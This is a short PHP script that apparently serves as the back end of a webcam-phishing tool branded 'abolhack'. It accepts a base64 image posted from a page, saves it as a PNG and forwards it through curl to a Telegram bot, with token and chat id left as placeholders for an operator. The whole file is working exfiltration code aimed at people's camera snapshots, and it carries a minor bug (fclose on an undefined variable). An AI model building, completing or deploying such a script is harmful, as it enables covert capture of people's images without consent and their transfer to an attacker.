<?php

$date = date('dMYHis');
$imageData=$_POST['cat'];

if (!empty($_POST['cat'])) {
error_log("Received" . "\r\n", 3, "Log.log");

}

$filteredData=substr($imageData, strpos($imageData, ",")+1);
$unencodedData=base64_decode($filteredData);
$fp = fopen( 'abolhack'.$date.'.png', 'wb' );
fwrite( $fp, $unencodedData);
fclose($fb);
$bot_url = "https://api.telegram.org/botabolhacktoken";
$url = $GLOBALS['bot_url'] . "/sendPhoto";
    $post_params = [
                        'chat_id' => "abolhackid" ,
                        'photo'   => new CURLFILE(realpath('abolhack'.$date.'.png')) ,
                    ];
    send_reply($url, $post_params);

function send_reply($url, $post_params) {
        
        $cu = curl_init();
        curl_setopt($cu, CURLOPT_URL, $url);
        curl_setopt($cu, CURLOPT_POSTFIELDS, $post_params);
        curl_setopt($cu, CURLOPT_RETURNTRANSFER, true);
        $result = curl_exec($cu);
        curl_close($cu);
        return $result;
    }
exit();

?>
